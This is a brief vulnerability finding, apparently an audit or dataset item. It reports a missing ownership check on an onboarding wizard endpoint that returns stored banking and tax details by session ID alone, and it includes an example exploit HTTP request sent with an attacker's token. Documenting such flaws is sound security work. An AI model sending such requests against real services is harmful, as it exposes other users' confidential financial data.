diagnosis: The onboarding wizard state endpoint reads sensitive financial and tax identification details stored in Redis solely by session_id. It never checks whether state.get('user_id') == str(current_user.id), allowing an attacker who acquires or guesses the session ID to view confidential business banking details.
exploit_request:
GET /api/v1/onboarding/wizard/b19a8421-5079-4d8b-9442-aa8194821034/state HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_jwt>
